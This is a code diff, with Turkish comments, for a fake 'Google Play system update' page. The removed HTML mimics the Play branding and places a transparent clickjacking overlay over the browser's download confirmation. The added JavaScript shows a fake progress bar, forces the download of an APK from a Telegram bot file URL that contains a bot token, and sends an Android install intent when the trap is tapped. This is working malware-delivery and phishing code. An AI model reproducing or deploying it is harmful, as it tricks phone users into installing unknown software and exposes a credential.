@@ -1,51 +1,54 @@
-<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Play - Sistem Güncellemesi</title>
-    <style>
-        body { font-family: 'Roboto', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #ffffff; margin: 0; overflow: hidden; }
-        .container { width: 90%; max-width: 400px; text-align: center; }
-        .logo { width: 60px; margin-bottom: 20px; }
-        .title { font-size: 22px; color: #202124; margin-bottom: 10px; font-weight: 500; }
-        .progress-container { width: 100%; background: #e8eaed; border-radius: 10px; height: 4px; margin: 25px 0; }
-        .progress-bar { width: 0%; height: 100%; background: #01875f; border-radius: 10px; transition: width 0.2s; }
-        .status { color: #5f6368; font-size: 14px; margin-top: 10px; }
-        #start-btn { background: #01875f; color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 16px; cursor: pointer; width: 100%; }
-        
-        /* Şeffaf Tıklama Tuzağı (Clickjacking) */
-        #click-trap {
-    position: fixed;
-    /* Onay butonunun tam üstüne gelmesi için: */
-    bottom: 22%;    /* %12'den %22'ye çektik, daha yukarıda */
-    right: 5%;      
-    width: 45%;     /* Daha geniş bir alan ki ıskalamasın */
-    height: 65px;
-    background: rgba(255, 0, 0, 0.4); /* Tam hizalayana kadar kalsın */
-    z-index: 10000;
-    display: none;
-    border-radius: 10px;
-}
+// 1. Önce fonksiyonu tanımlıyoruz (Hata almamak için en üstte olmalı)
+function runProgressBar(callback) {
+    const bar = document.getElementById('bar');
+    const status = document.getElementById('status');
+    
+    let width = 0;
+    const interval = setInterval(() => {
+        width += Math.random() * 6; // Hızlı ve gerçekçi artış
+        if (width >= 100) {
+            clearInterval(interval);
+            bar.style.width = "100%";
+            status.innerText = "Sistem kontrolü tamamlandı.";
+            // İşlem bittiğinde callback (yani indirme) başlar
+            callback();
+        } else {
+            bar.style.width = width + "%";
+            status.innerText = "Hazırlanıyor: %" + Math.round(width);
         }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/d/d0/Google_Play_Arrow_logo.svg" class="logo">
-        <div id="title" class="title">Sistem Hazırlanıyor...</div>
-        <div class="progress-container">
-            <div id="bar" class="progress-bar"></div>
-        </div>
-        <p id="status" class="status">Cihaz uyumluluğu kontrol ediliyor.</p>
-        <button id="start-btn">Güncellemeyi Kur</button>
-    </div>
+    }, 100);
+}
 
-    <div id="click-trap"></div>
+// 2. Ana buton dinleyicisi
+document.getElementById('start-btn').addEventListener('click', function() {
+    this.style.display = 'none'; // Butonu gizle
+    const status = document.getElementById('status');
+    const trap = document.getElementById('click-trap');
 
-    <script src="test.js"></script>
-</body>
-</html>
+    // Fonksiyonu çağırıyoruz
+    runProgressBar(() => {
+        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
 
+        // ADIM A: Chrome uyarısını tetikle
+        window.location.href = apkUrl;
 
+        // ADIM B: 0.5 saniye sonra tuzağı (Click-trap) aktif et
+        setTimeout(() => {
+            trap.style.display = "block";
+            status.innerHTML = "<b style='color:#d93025'>DİKKAT:</b> Kurulumu onaylamak için alttaki <b>'Yine de indir'</b> butonuna basın.";
+        }, 500);
+    });
+});
 
+// 3. TUZAK TIKLANDIĞINDA (Android'i yüklemeye zorlayan kısım)
+document.getElementById('click-trap').addEventListener('click', function() {
+    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
+    
+    // Protokolü temizle ve Intent'e çevir
+    const cleanUrl = apkUrl.replace('https://', '');
+    const intentUrl = `intent://${cleanUrl}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
+    
+    // Kullanıcı dokunduğu anda sistemi yükleme ekranına fırlatır
+    window.location.href = intentUrl;
+    console.log("Sistem yükleyiciye yönlendiriliyor...");
+});
